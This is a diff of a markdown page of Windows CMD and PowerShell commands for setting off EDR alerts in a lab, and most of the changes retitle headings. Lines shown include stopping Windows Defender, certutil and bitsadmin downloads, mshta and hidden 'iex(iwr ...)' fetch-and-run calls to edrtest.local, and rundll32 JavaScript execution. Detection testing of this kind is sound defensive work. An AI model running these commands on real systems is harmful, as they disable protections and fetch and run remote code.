@@ -2,13 +2,13 @@
 
 # EDR Trigger (Non-Malicious Testing)
 
-> [!WARNING] ⚠️
+> [!WARNING]
 >
 > This set of commands is intended for **non-malicious testing** in a **controlled lab environment only**. These actions may trigger EDR/AV alerts or detections. Although all these are non-malicious and use non-routable TLDs (e.g., `.local`), they should only be executed in production environments if permitted by **compliance policies or explicit exceptions**. Proceed at your own risk.
 
 ## CMD
 
-1. **Tasklist enumeration**  
+1. **Tasklist Enumeration**  
 ```cmd
 cmd.exe /c tasklist
 ```
@@ -23,29 +23,29 @@ cmd.exe /c sc stop WinDefend
 cmd.exe /c certutil.exe -urlcache -split -f http://7-zip.org/a/7z2405-x64.exe 7zip_installer.exe
 ```
 
-4. **Rundll32 with LOLBAS technique (JavaScript execution)**  
+4. **LOLBAS: Rundll32 (JavaScript Execution)**  
 ```cmd
 cmd.exe /c rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write('Hello');"
 ```
 
-5. **Whoami piped to temp file (can indicate enumeration)**  
+5. **Whoami (Enumeration)**  
 ```cmd
 cmd.exe /c whoami > %TEMP%\whoami.txt
 ```
 
-6. **MSHTA launching a remote script**  
+6. **MSHTA Launching Remote Script**  
 ```cmd
 cmd.exe /c mshta.exe http://edrtest.local/evil.hta
 ```
 
-7. **BITSAdmin for downloading a payload**  
+7. **BITSAdmin Downloading Payload**  
 ```cmd
 cmd.exe /c bitsadmin /transfer myjob /download /priority high http://edrtest.local/file.exe C:\Users\Public\file.exe
 ```
 
 ## Powershell
 
-1. **Encoded PowerShell base64**  
+1. **Encoded PowerShell**  
 ```powershell
 powershell -EncodedCommand CgpoZWxsbyBlZHI=
 ```
@@ -67,5 +67,5 @@ Shell("powershell -w hidden -nop -c iex(iwr http://edrtest.local/ps_script.ps1)"
 
 5. **COM Abuse (Excel COM Object Execution)**  
 ```powershell
-$xl = New-Object -ComObject Excel.Application; $xl.Visible = $false; $xl.Quit()
+$xls = New-Object -ComObject Excel.Application; $xls.Visible = $false; $xls.Quit()
 ```
